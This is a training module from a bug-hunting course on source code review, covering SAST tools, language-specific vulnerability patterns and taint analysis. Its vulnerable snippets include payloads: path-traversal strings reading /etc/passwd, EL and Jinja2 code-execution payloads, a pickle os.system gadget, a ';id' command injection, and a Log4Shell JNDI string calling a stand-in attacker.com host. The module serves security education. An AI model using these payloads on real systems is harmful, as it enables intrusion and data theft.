Source Code Review

Bug Hunting • Module 18 • Mastery Track

When you have access to an application's source code, the game changes completely. Instead of probing a black box for clues about its internal behavior, you can read the logic directly, trace data flows from user input to dangerous function calls, and identify vulnerability patterns that would be invisible from the outside. This module covers the tools, techniques, and language-specific patterns that make source code review one of the most powerful skills in a bug hunter's arsenal.

Section 01

🔎 White-Box vs Black-Box

Black-box testing means you have no visibility into the application's internals. You send inputs and observe outputs, inferring behavior from responses. White-box testing means you have full access to the source code, configuration files, database schemas, and internal documentation. Gray-box sits between the two — you might have partial source access, API documentation, or architectural diagrams without the complete codebase.

For bug bounty hunters, source code access arises in several common situations. Open-source software is the most obvious: if the target runs WordPress, Laravel, Django, or any other open-source framework, you can read every line of the framework code and often the application code as well. Client-side JavaScript is always available through browser developer tools and often contains API endpoint definitions, authentication logic, and business rules that were never meant to be public. Leaked or accidentally committed source code on GitHub is another frequent source — companies regularly push credentials, internal tools, and proprietary code to public repositories by mistake.

Advantages of White-Box Hunting

▶ What You Gain

  • • Direct visibility into authentication and authorization logic
  • • Ability to trace user input from entry point to dangerous function calls
  • • Access to internal API routes not exposed in the UI
  • • Insight into error handling, logging, and data validation patterns
  • • Understanding of database queries and ORM usage
  • • Knowledge of third-party dependencies and their versions

▶ When Source Is Available

  • • Open-source projects (GitHub, GitLab, SourceForge)
  • • Client-side JavaScript (always accessible via browser)
  • • Leaked repositories (GitHub dorking, truffleHog results)
  • • Source maps (.js.map files left on production servers)
  • • Decompiled mobile applications (APK/IPA analysis)
  • • Programs that explicitly provide source access

Approaching a Large Codebase

The single biggest mistake in source code review is trying to read every file sequentially. A modern web application can have hundreds of thousands of lines of code across thousands of files. You need a strategy that focuses your time on the code paths most likely to contain vulnerabilities.

  1. Identify the technology stack. Read configuration files, package manifests (package.json, composer.json, requirements.txt, pom.xml), and deployment configurations. Knowing the framework dictates which vulnerability patterns to look for.
  2. Map entry points. Find route definitions, controller files, and API endpoint registrations. These are where user input enters the application. In Express, look for app.get() and router.post(). In Django, look for urls.py. In Spring, look for @RequestMapping annotations.
  3. Search for dangerous functions. Grep the codebase for known-dangerous function calls: eval(), exec(), system(), unserialize(), innerHTML, raw SQL query construction. Each hit is a potential sink that needs investigation.
  4. Trace authentication and authorization. Identify middleware, decorators, or filters that enforce access control. Look for routes that are missing these protections or that implement custom auth logic instead of using the framework's built-in mechanisms.
  5. Check dependency versions. Cross-reference dependencies against known CVE databases. A vulnerable version of a library is often the fastest path to a valid finding.
ℹ
Source Maps Are Gold
Many production deployments accidentally include JavaScript source maps (.js.map files). These files contain the original, unminified source code for the entire frontend application, including comments, variable names, and internal API paths. Check for sourceMappingURL comments at the bottom of minified JS bundles and try appending .map to any JavaScript file URL. Recovering source maps is a common first step in white-box analysis of modern single-page applications.
Section 02

🛠 SAST Tools for Hunters

Static Application Security Testing (SAST) tools analyze source code without executing it. They parse the code into an abstract syntax tree, apply pattern matching or data flow analysis rules, and report potential vulnerabilities. For bug bounty hunters, SAST tools are force multipliers — they can scan millions of lines of code in minutes and surface patterns that would take hours to find manually.

Semgrep

Semgrep is a lightweight, open-source static analysis tool that has become the go-to SAST tool for security researchers. Its power lies in its rule syntax, which closely mirrors the code it is analyzing. Instead of learning a complex query language, you write patterns that look like the vulnerable code you want to find.

# Install Semgrep pip install semgrep # Run with community rules against a codebase semgrep --config auto /path/to/target # Run specific security rulesets semgrep --config p/owasp-top-ten /path/to/target semgrep --config p/security-audit /path/to/target # Run with a custom rule file semgrep --config my-rules.yaml /path/to/target

Writing custom Semgrep rules is where the real advantage lies. The community rulesets catch generic patterns, but custom rules let you target application-specific logic:

# Custom rule: detect raw SQL query construction in Python rules: - id: raw-sql-format-string patterns: - pattern: | cursor.execute(f"...{$VAR}...") message: Potential SQL injection via f-string in cursor.execute() languages: [python] severity: ERROR # Custom rule: detect missing auth middleware on Express routes - id: express-route-no-auth patterns: - pattern: | app.$METHOD($PATH, (req, res) => { ... }) - pattern-not: | app.$METHOD($PATH, authenticate, ...) message: Route handler without authentication middleware languages: [javascript] severity: WARNING

CodeQL

CodeQL is GitHub's semantic code analysis engine. Unlike Semgrep's pattern matching, CodeQL treats code as a database that you can query using a SQL-like language. This makes it exceptionally powerful for data flow analysis — tracing how user-controlled data moves through an application from sources to sinks. GitHub automatically runs CodeQL on public repositories, and you can run it locally on any open-source project.

// CodeQL query: find SQL injection in Java import java import semmle.code.java.dataflow.TaintTracking import semmle.code.java.security.SqlInjectionQuery from SqlInjectionConfig config, DataFlow::PathNode source, DataFlow::PathNode sink where config.hasFlowPath(source, sink) select sink.getNode(), source, sink, "This query depends on a $@ user-provided value.", source.getNode(), "user-provided value"

Layer Your Tools
No single SAST tool catches everything. Run Semgrep for fast pattern matching, then use CodeQL for deeper data flow analysis on the most interesting code paths. Use language-specific tools (Bandit for Python, ESLint security plugins for JavaScript) for specialized checks. The overlap is minimal — each tool catches different classes of issues.
Section 03

🐛 PHP Vulnerability Patterns

PHP powers a massive portion of the web — WordPress, Drupal, Joomla, Magento, Laravel, and countless custom applications. Its long history and dynamic typing create a rich landscape for vulnerability hunting. PHP codebases are among the most rewarding targets for source code review because the language's design choices create predictable, well-documented vulnerability patterns.

Deserialization via unserialize()

PHP's unserialize() function reconstructs PHP objects from a serialized string. When the serialized data comes from user input, an attacker can craft a payload that instantiates arbitrary objects and triggers their magic methods (__destruct(), __wakeup(), __toString()). This is known as a PHP Object Injection attack, and it can lead to remote code execution if the right "gadget chain" of classes exists in the application or its dependencies.

// VULNERABLE: unserialize() on user-controlled input $data = unserialize($_COOKIE['session_data']); // VULNERABLE: unserialize() on data from database (if DB was compromised) $config = unserialize($row['settings']); // SAFE: use json_decode() instead $data = json_decode($_COOKIE['session_data'], true); // PARTIAL MITIGATION: allowed_classes parameter (PHP 7+) $data = unserialize($input, ['allowed_classes' => false]);

File Inclusion (LFI/RFI)

PHP's include(), require(), include_once(), and require_once() functions load and execute PHP files. When the file path is constructed from user input, an attacker can include arbitrary local files (Local File Inclusion) or, if allow_url_include is enabled, remote files from attacker-controlled servers (Remote File Inclusion).

// VULNERABLE: LFI via user-controlled path $page = $_GET['page']; include("templates/" . $page . ".php"); // Attack: ?page=../../../../etc/passwd%00 // Attack: ?page=php://filter/convert.base64-encode/resource=config // VULNERABLE: dynamic class loading $controller = $_GET['action']; require_once("controllers/{$controller}Controller.php"); // SAFE: whitelist approach $allowed = ['home', 'about', 'contact']; if (in_array($_GET['page'], $allowed)) { include("templates/" . $_GET['page'] . ".php"); }

Type Juggling

PHP's loose comparison operator (==) performs type coercion before comparison. This creates authentication bypass vulnerabilities when string comparisons are done loosely against values that PHP interprets as numbers or special types.

// PHP type juggling vulnerabilities var_dump("0e12345" == "0e67890"); // true (both are 0 in scientific notation) var_dump("0" == false); // true var_dump("" == null); // true var_dump("1" == true); // true // VULNERABLE: loose comparison in auth check if (md5($password) == $stored_hash) { // bypass if both hashes start with 0e authenticate(); } // SAFE: strict comparison if (hash_equals(md5($password), $stored_hash)) { authenticate(); }

Other Dangerous PHP Functions

eval() / assert()
Direct code execution. Search for any use with user-controlled input. assert() in PHP 5 evaluates strings as code. Often found in template engines, math calculators, and plugin systems.
preg_replace with /e
The /e modifier (deprecated in PHP 7) evaluates the replacement string as PHP code. Legacy codebases may still contain this pattern. Search for preg_replace with /e flag.
SQL in CMS Plugins
WordPress plugins often bypass the framework's $wpdb->prepare() method and construct raw SQL queries. Search for $wpdb->query() calls that concatenate user input directly.
extract() on User Data
The extract() function creates variables from array keys. When used on $_GET or $_POST, it lets attackers overwrite any local variable, including authentication flags.
⚠
CMS Plugin Goldmine
WordPress has over 60,000 plugins, and most are written by developers who are not security specialists. The plugin ecosystem is the richest hunting ground for PHP vulnerabilities. Popular plugins with millions of installs receive scrutiny, but plugins in the 10,000–100,000 install range often have critical vulnerabilities that have never been audited. WPScan's vulnerability database tracks known issues, but the majority of plugins have never been reviewed at all.
Section 04

⚙ Java & .NET Patterns

Java and .NET power the enterprise web. Banks, insurance companies, government agencies, and large corporations overwhelmingly build on these platforms. The vulnerability patterns differ significantly from PHP and scripting languages because Java and C# are statically typed, compiled, and run within managed runtimes. Yet they carry their own dangerous patterns, many of which have produced some of the most impactful vulnerabilities in recent memory.

Expression Language Injection

Java EE and Spring applications use Expression Language (EL) to dynamically resolve values in JSP pages and other templates. When user input is embedded in an EL expression without sanitization, an attacker can execute arbitrary Java code on the server. This is particularly dangerous because EL has access to the runtime environment, including the ability to invoke system commands.

// VULNERABLE: user input in Spring EL expression @RequestMapping("/search") public String search(@RequestParam String query, Model model) { // If query is reflected into a JSP that evaluates EL... model.addAttribute("searchQuery", query); return "search-results"; } // In the JSP: ${searchQuery} -- if evaluating as EL, attacker can inject: // ${T(java.lang.Runtime).getRuntime().exec('id')} // Search patterns for EL injection: // - SpelExpressionParser with user input // - ExpressionFactory.createValueExpression with untrusted data // - #{} or ${} in JSP/JSF pages with reflected values

JNDI Injection (Log4Shell Pattern)

The Log4Shell vulnerability (CVE-2021-44228) demonstrated the devastating impact of JNDI injection at global scale. Java Naming and Directory Interface (JNDI) allows Java applications to look up objects from external naming services. When user-controlled data reaches a JNDI lookup, the attacker can force the application to load and execute a remote Java class from an attacker-controlled LDAP or RMI server.

// The Log4Shell pattern: user input reaches Log4j's message formatting // Log4j resolves ${jndi:ldap://attacker.com/exploit} via JNDI lookup logger.info("User login: " + username); // If username = "${jndi:ldap://attacker.com/a}" --> RCE // Broader JNDI injection pattern (beyond Log4j): InitialContext ctx = new InitialContext(); ctx.lookup(userInput); // Direct JNDI injection // Search for JNDI sinks in Java codebases: // - InitialContext.lookup() with dynamic arguments // - JndiTemplate.lookup() // - Spring's JndiLocatorSupport subclasses

Java Deserialization

Java's ObjectInputStream.readObject() is the Java equivalent of PHP's unserialize(). When serialized Java objects come from untrusted sources, an attacker can craft payloads using "gadget chains" — sequences of existing class methods that, when triggered during deserialization, lead to code execution. The ysoserial tool automates gadget chain generation for common libraries like Apache Commons Collections, Spring Framework, and Hibernate.

// VULNERABLE: deserializing untrusted data ObjectInputStream ois = new ObjectInputStream(request.getInputStream()); Object obj = ois.readObject(); // Attacker controls the byte stream // Search patterns for Java deserialization: // - ObjectInputStream.readObject() // - XMLDecoder.readObject() // - Serializable classes with readObject()/readResolve() // - Content-Type: application/x-java-serialized-object // - Base64-encoded data starting with rO0AB (serialized Java magic bytes)

.NET Deserialization

.NET has its own set of dangerous deserializers. BinaryFormatter, ObjectStateFormatter, NetDataContractSerializer, and SoapFormatter are all vulnerable to the same class of attacks as Java's ObjectInputStream. Microsoft has deprecated BinaryFormatter and recommends System.Text.Json as a safe alternative, but legacy .NET applications are full of these patterns.

// VULNERABLE: .NET BinaryFormatter deserialization BinaryFormatter formatter = new BinaryFormatter(); object obj = formatter.Deserialize(requestStream); // VULNERABLE: ViewState deserialization (ASP.NET) // If machineKey is known or ViewState MAC is disabled // __VIEWSTATE parameter can contain serialized .NET objects // Search patterns for .NET deserialization: // - BinaryFormatter.Deserialize() // - ObjectStateFormatter.Deserialize() // - TypeNameHandling.All in JSON.NET configuration // - enableViewStateMac="false" in web.config

XML External Entity (XXE) in Java

Java's default XML parsers (DocumentBuilderFactory, SAXParser, XMLReader) have external entity processing enabled by default in many versions. When the application parses XML from untrusted sources, an attacker can define external entities that read local files, make SSRF requests, or cause denial of service.

// VULNERABLE: default XML parser settings in Java DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); // No security features disabled -- XXE possible DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(request.getInputStream()); // SAFE: disable external entities DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); dbf.setFeature("http://xml.org/sax/features/external-general-entities", false); dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
⚠
Spring Framework Pitfalls
Spring Boot applications frequently expose actuator endpoints (/actuator/env, /actuator/heapdump) that leak environment variables, credentials, and heap memory. Search for management.endpoints.web.exposure in application.properties or application.yml. Also check for Spring's @PathVariable and @RequestParam annotations where user input flows into database queries without parameterization.
Section 05

💻 Python & Node.js Patterns

Python and Node.js dominate modern web application development, particularly for startups, SaaS platforms, and API-driven architectures. Both languages are dynamically typed and emphasize rapid development, which means security shortcuts are common in production code. The vulnerability patterns differ from compiled languages but are equally exploitable.

Python: Pickle Deserialization

Python's pickle module serializes Python objects into a byte stream and can reconstruct them later. The documentation explicitly warns: "The pickle module is not secure. Only unpickle data you trust." Despite this warning, pickle is used in machine learning model storage, caching systems, session management, and inter-process communication. When user-controlled data reaches pickle.loads(), the result is remote code execution.

# VULNERABLE: pickle on user-controlled data import pickle, base64 data = base64.b64decode(request.cookies['session']) session = pickle.loads(data) # RCE if attacker controls cookie # VULNERABLE: pickle in Redis/Memcached session store cached = redis_client.get(session_key) user_data = pickle.loads(cached) # Exploitable if Redis is compromised # Malicious pickle payload (conceptual) import os class Exploit: def __reduce__(self): return (os.system, ('id',)) # SAFE: use JSON, msgpack, or protobuf instead import json session = json.loads(request.cookies['session'])

Python: Template Injection (SSTI)

Server-Side Template Injection occurs when user input is embedded directly into a template string that is then rendered by the template engine. Jinja2 (Flask), Mako (Pyramid), and Django's template engine all have different exploitation paths, but Jinja2 SSTI is the most commonly found in bug bounty programs because Flask is widely used for API backends.

# VULNERABLE: user input rendered as Jinja2 template from flask import Flask, request, render_template_string @app.route('/greet') def greet(): name = request.args.get('name') template = '<h1>Hello ' + name + '</h1>' return render_template_string(template) # SSTI! # Payload: ?name={{config.items()}} # RCE: ?name={{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}} # SAFE: pass variables as context, not string concatenation return render_template_string('<h1>Hello {{ name }}</h1>', name=name)

Node.js: Prototype Pollution

Prototype pollution is a JavaScript-specific vulnerability where an attacker modifies the prototype of a base object (Object.prototype), causing the injected properties to be inherited by all objects in the application. This can lead to denial of service, authentication bypass, or remote code execution depending on how the polluted properties are used downstream.

// VULNERABLE: recursive merge without prototype check function merge(target, source) { for (let key in source) { if (typeof source[key] === 'object') { if (!target[key]) target[key] = {}; merge(target[key], source[key]); } else { target[key] = source[key]; } } } // Attacker sends: {"__proto__": {"isAdmin": true}} merge({}, JSON.parse(userInput)); // Now every object in the app has isAdmin === true // Common sinks affected by prototype pollution: // - child_process.exec/spawn (command injection via shell option) // - Handlebars/Pug template compilation // - Express request processing // Search patterns: // - Recursive merge/extend/assign without __proto__ filtering // - lodash.merge, lodash.defaultsDeep (vulnerable in older versions) // - Object.assign with nested user input

Node.js: eval() and Command Injection

// VULNERABLE: eval on user input app.get('/calculate', (req, res) => { let result = eval(req.query.expression); // RCE res.json({ result }); }); // VULNERABLE: command injection via child_process const { exec } = require('child_process'); app.get('/ping', (req, res) => { exec(`ping -c 1 ${req.query.host}`, (err, stdout) => { res.send(stdout); }); // Attack: ?host=;id }); // SAFE: use execFile with argument array const { execFile } = require('child_process'); execFile('ping', ['-c', '1', req.query.host], (err, stdout) => { res.send(stdout); });

Path Traversal in File Operations

# Python: VULNERABLE path traversal @app.route('/download') def download(): filename = request.args.get('file') return send_file(f'uploads/{filename}') # Attack: ?file=../../../etc/passwd # Python: SAFE -- resolve and validate path import os def download(): filename = request.args.get('file') safe_dir = os.path.realpath('uploads') file_path = os.path.realpath(os.path.join('uploads', filename)) if not file_path.startswith(safe_dir): abort(403) return send_file(file_path)
ℹ
npm Package Supply Chain
Node.js applications average hundreds of transitive dependencies. Check package-lock.json for known vulnerable versions using npm audit or Snyk. Beyond known CVEs, look for packages with typosquatted names, low download counts, or recent ownership changes — indicators of potential supply chain attacks. The node_modules directory on a production server can reveal the exact dependency tree including versions with known vulnerabilities.
Section 06

🔬 Taint Analysis & Source-to-Sink

Taint analysis is the systematic process of tracking how user-controlled data (tainted data) flows through an application from the point where it enters (the source) to the point where it is used in a dangerous operation (the sink). If tainted data reaches a sink without adequate sanitization or validation along the way, a vulnerability exists. This is the conceptual foundation that all source code review builds upon.

Sources, Sinks, and Sanitizers

Sources (Data Entry Points)
Any point where user-controlled data enters the application. HTTP request parameters (GET, POST, headers, cookies), file uploads, database records that were previously written from user input, WebSocket messages, API responses from external services, environment variables set by user action.
Sinks (Dangerous Operations)
Functions that perform operations that become dangerous when processing untrusted data. SQL query execution, OS command execution, file system operations, HTML rendering, HTTP redirects, deserialization, XML parsing, LDAP queries, email header construction, logging functions.
Sanitizers (Defenses)
Functions that transform or validate tainted data to make it safe for a specific sink. Parameterized queries for SQL, HTML encoding for XSS, input validation (whitelisting), path canonicalization for file operations. A sanitizer is only effective if it matches the sink — HTML encoding does not prevent SQL injection.

Manual Taint Tracking

When SAST tools produce no results or you need to verify a finding, manual taint tracking is the definitive approach. Start at either end — trace forward from a source or backward from a sink — and follow every variable assignment, function call, and conditional branch that the data passes through.

  1. Identify the source. Pick a specific user input: a URL parameter, a POST body field, an HTTP header. Note the variable name it is assigned to.
  2. Trace the variable. Follow it through every assignment, function argument, and return value. Use your IDE's "Find Usages" or "Go to Definition" features. Document the path in a text file.
  3. Check for transformations. At each step, ask: is the data validated, encoded, escaped, or truncated? Is the sanitization appropriate for the eventual sink? Is there a code path that bypasses the sanitization?
  4. Identify the sink. Where does the traced data end up? A SQL query? An OS command? An HTML template? The nature of the sink determines the vulnerability class.
  5. Assess exploitability. Can you craft input that survives all transformations and triggers the vulnerable behavior at the sink? What is the impact?

Common Source-to-Sink Patterns

Source Sink Vulnerability Required Sanitizer
URL parameter SQL query string SQL Injection Parameterized queries / prepared statements
Form input HTML template Cross-Site Scripting Context-aware output encoding
HTTP header system() / exec() OS Command Injection Argument array (no shell interpretation)
File upload name File system path Path Traversal Path canonicalization + directory check

Building a Vulnerability Hypothesis

Effective source code review is hypothesis-driven. Instead of reading code line by line, you form a hypothesis — "I think user input from the search parameter reaches the database query without parameterization" — and then test that hypothesis by tracing the code. If the hypothesis is confirmed, you have a finding. If it is disproven (the data is properly sanitized), you move to the next hypothesis. This approach is dramatically more efficient than exhaustive line-by-line review.

✓
Backward Tracing Is Often Faster
Instead of tracing forward from sources, start at sinks. Search the codebase for dangerous function calls (exec(), query(), innerHTML), then trace backward to determine whether user input can reach them. There are far fewer sinks than sources in a typical application, so backward tracing covers more ground with less effort. If a sink only receives data from hardcoded strings or internal constants, you can dismiss it immediately.
Section 07

📋 Code Review Methodology

A systematic methodology prevents you from spending hours on code paths that are well-defended while missing critical vulnerabilities in overlooked corners of the application. The best code reviewers combine automated scanning with targeted manual review, prioritizing the code that handles the most sensitive operations.

The Systematic Approach

  1. Entry points first. Start with route definitions and controllers. Map every URL the application responds to and what code handles each one. This gives you the complete attack surface before diving into implementation details.
  2. Authentication boundaries. Identify which routes require authentication and which are publicly accessible. Look for routes that should require authentication but do not, or routes that check authentication but not authorization (a logged-in user accessing another user's data).
  3. Data flow through sensitive operations. For each route that handles sensitive data (user profiles, payments, file operations, admin actions), trace the complete data flow from request to response. Where does user input go? What happens to it along the way?
  4. Framework-specific checks. Every framework has known pitfalls. Django's |safe filter disables auto-escaping. Express middleware ordering matters. Spring's @CrossOrigin without explicit origins allows any origin. Check for these framework-specific mistakes.
  5. Dependency audit. After reviewing application code, audit the dependency tree. Run npm audit, pip audit, or mvn dependency-check:check. Cross-reference versions with CVE databases.
  6. Configuration review. Check deployment configs, environment variable handling, secret management, CORS policies, CSP headers, and session configuration. Misconfigurations are frequently more impactful than code-level bugs.

Time-Boxing Reviews

Allocate specific time blocks to different review phases. A productive allocation for a medium-sized web application:

Phase Time Focus
Reconnaissance 30 minutes Technology stack, file structure, entry points, dependency versions
Automated Scanning 30 minutes Run Semgrep, Bandit, npm audit. Triage results for false positives
Auth & Access Control 60 minutes Authentication logic, session handling, authorization checks on every route
Input Handling 60 minutes Trace user input through high-risk code paths (SQL, file ops, commands)
Business Logic 60 minutes Payment flows, state machines, rate limiting, multi-step operations
Configuration 30 minutes Secrets, CORS, CSP, cookie flags, debug modes, exposed endpoints

Code Review Checklist

Security Code Review Checklist
Essential checks for every codebase review
▼

Authentication:

  • Password hashing algorithm (bcrypt/argon2 or weak MD5/SHA1)
  • Session token generation (cryptographically random or predictable)
  • Session fixation protections (regenerate on login)
  • Password reset flow (token expiration, single use, email verification)
  • Multi-factor authentication implementation

Authorization:

  • Every route checked for auth middleware or decorator
  • Object-level authorization (can user A access user B's resource?)
  • Role escalation paths (can a regular user reach admin functions?)
  • API endpoints vs. UI endpoints (APIs often lack auth that UI has)

Input Handling:

  • SQL queries: parameterized or string-concatenated
  • HTML output: auto-escaped or raw rendering
  • File operations: path validation and directory traversal checks
  • OS commands: argument arrays or shell string interpolation
  • Deserialization: safe formats (JSON) or dangerous (pickle, unserialize)

Configuration:

  • Debug mode disabled in production
  • Secrets not hardcoded in source
  • CORS policy restrictive (not wildcard)
  • Cookie flags: Secure, HttpOnly, SameSite
  • Error handling: generic messages to users, detailed logs internally
ℹ
Document Everything
Keep a running log of your review: which files you checked, what you found, and what you ruled out. This prevents redundant work on long reviews, provides evidence for your reports, and builds a personal knowledge base of patterns you can apply to future reviews. A simple text file with timestamps and notes is sufficient. When you find a vulnerability, your documentation becomes the foundation of your bug report.

You have learned how to approach source code review systematically: leveraging SAST tools for broad coverage, recognizing language-specific vulnerability patterns in PHP, Java, .NET, Python, and Node.js, applying taint analysis to trace data from sources to sinks, and following a structured methodology that maximizes your findings within a reasonable time investment.
